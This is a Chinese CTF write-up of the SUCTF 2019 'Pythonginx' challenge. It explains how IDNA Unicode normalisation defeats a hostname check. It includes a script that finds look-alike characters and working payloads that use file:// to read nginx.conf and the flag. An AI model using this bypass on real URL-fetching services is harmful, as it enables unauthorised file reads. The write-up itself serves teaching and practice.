# \[SUCTF 2019]Pythonginx

## \[SUCTF 2019]Pythonginx

## 考点

* Unicode安全性
* Nginx配置文件

## wp

给了源码

```python
@app.route('/getUrl', methods=['GET', 'POST'])
def getUrl():
    url = request.args.get("url")
    host = parse.urlparse(url).hostname
    if host == 'suctf.cc':
        return "我扌 your problem? 111"
    parts = list(urlsplit(url))
    host = parts[1]
    if host == 'suctf.cc':
        return "我扌 your problem? 222 " + host
    newhost = []
    for h in host.split('.'):
        newhost.append(h.encode('idna').decode('utf-8'))
    parts[1] = '.'.join(newhost)
    #去掉 url 中的空格
    finalUrl = urlunsplit(parts).split(' ')[0]
    host = parse.urlparse(finalUrl).hostname
    if host == 'suctf.cc':
        return urllib.request.urlopen(finalUrl).read()
    else:
        return "我扌 your problem? 333"
```

通过parse.urlparse解析传入的URL，并返回hostname。

```python
url = 'https://www.baidu.com/index.php?tn=monline_3_dg'
host = parse.urlparse(url).hostname
# www.baidu.com
```

然后使用urlsplit对URL分割为parts列表，再把parts中的hostname赋值给host，然后对host中的字母用inda编码再用utf-8解码，再用`.`重新拼接。

```python
parts = list(urlsplit(url)) 
# ['https', 'www.baidu.com', '/index.php', 'tn=monline_3_dg', '']
host = parts[1]
newhost = []
for h in host.split('.'):
    newhost.append(h.encode('idna').decode('utf-8'))
# newhost ['www', 'baidu', 'com']
parts[1] = '.'.join(newhost)
# ['https', 'www.baidu.com', '/index.php', 'tn=monline_3_dg', '']
```

去掉parts中的空格后，再用parse.urlparse解析。

```python
finalUrl = urlunsplit(parts).split(' ')[0]
# https://www.baidu.com/index.php?tn=monline_3_dg
host = parse.urlparse(finalUrl).hostname
# www.baidu.com
```

最后如果host是`suctf.cc`就发送请求，否则给出错误提示，这里就是一个矛盾，不能输入`suctf.cc`最后结果却是`suctf.cc`。

```python
if host == 'suctf.cc':
    return urllib.request.urlopen(finalUrl).read()
else:
    return "我扌 your problem? 333"
```

代码里面有个很奇怪的地方，host为什么要用`idna`编码，查一下就可以查到相关的资料，在blackhat有个议题[Host/Split Exploitable Antipatterns in Unicode Normalization](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)

写脚本爆破，找一个能表示c的Unicode字符

```python
# coding:utf-8 
for i in range(128,10000):
    tmp = chr(i)
    try:
        res = tmp.encode('idna').decode('utf-8') 
        if res == 'c':
            print(i,str(hex(i)))
            eval(f"print('\\u{str(hex(i))[2:]}'.encode())")
            
    except: 
        pass
```

得到结果

```
8450 0x2102
b'\xe2\x84\x82'
8493 0x212d
b'\xe2\x84\xad'
8557 0x216d
b'\xe2\x85\xad'
8573 0x217d
b'\xe2\x85\xbd'
9400 0x24b8
b'\xe2\x92\xb8'
9426 0x24d2
b'\xe2\x93\x92'
```

传入参数 `getUrl?url=http://suctf.c%e2%93%92/`，成功访问

接着可以使用file协议读取文件 `getUrl?url=file://suctf.c%e2%93%92/usr/local/nginx/conf/nginx.conf`

得到结果

```
server {
    listen 80;
    location / {
        try_files $uri @app;
    }
    location @app {
        include uwsgi_params;
        uwsgi_pass unix:///tmp/uwsgi.sock;
    }
    location /static {
        alias /app/static;
    }
    # location /flag {
    #     alias /usr/fffffflag;
    # }
}
```

读取flag `getUrl?url=file://suctf.c%e2%93%92/usr/fffffflag`

## 小结

1. Nginx目录

```
配置文件存放目录：/etc/nginx
主配置文件：/etc/nginx/conf/nginx.conf
管理脚本：/usr/lib64/systemd/system/nginx.service
模块：/usr/lisb64/nginx/modules
应用程序：/usr/sbin/nginx
程序默认存放位置：/usr/share/nginx/html
日志默认存放位置：/var/log/nginx
配置文件目录为：/usr/local/nginx/conf/nginx.conf
```
